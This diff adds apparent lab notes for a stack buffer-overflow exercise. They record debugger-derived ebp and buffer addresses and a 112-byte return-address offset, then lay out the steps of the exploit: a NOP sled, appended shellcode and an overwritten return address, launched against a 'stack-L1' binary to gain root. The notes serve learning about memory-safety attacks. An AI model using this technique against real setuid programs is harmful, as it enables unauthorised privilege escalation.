@@ -1,0 +1,32 @@
+1. Debug the vulnerable program to find the debugged version of ebp address and buffer starting address
+p $ebp = 0xffffca18
+p &buffer = 0xffffc9ac
+
+$ebp - &buffer = 108
+RA - & buffer = 108 + 4 = 112
+
+2. Construct the bad file
+(1) content = bytearray(0x90 for i in range(n))
+(2) content[n-len(shellcode):] = shellcode
+(3) ret = $ebp + big_n, makesure no 0 in hex code, e.g., ret = 0xffffcb49
+(4) content[112:116] = (ret).to_bytes(L,byteorder='little') 
+-------------------------           
+        badfile
+-------------------------
+        NOP
+        ...
+        NOP
+-------------------------
+        RA
+-------------------------
+        saved ebp
+-------------------------
+        buffer[n]
+        ...
+        buffer[0]
+-------------------------
+
+3. Lauch the attack
+$ ./exploit.py
+$ ./stack-L1
+# get root privilege
